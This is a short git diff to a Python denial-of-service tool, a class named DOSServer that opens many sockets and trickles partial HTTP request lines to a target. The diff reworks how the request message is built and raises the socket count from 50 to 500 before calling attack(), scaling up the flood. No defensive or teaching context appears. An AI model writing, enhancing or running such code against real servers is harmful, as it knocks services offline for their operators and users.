@@ -61,9 +61,8 @@ class DOSServer():
         ]
         self.socket = [self.refreshSocket() for _ in range(socketsCount)]
 
-    def getMessage(self, message):
-        messages = self.message
-        return (messages + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")
+    def getMessage(self, inMessage):
+        return (self.message + inMessage + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")
 
     def refreshSocket(self):
         try:
@@ -96,5 +95,5 @@ class DOSServer():
                 time.sleep(sleep/len(self.socket))
 
 
-DOSServer = DOSServer(socketsCount=50)
+DOSServer = DOSServer(socketsCount=500)
 DOSServer.attack()
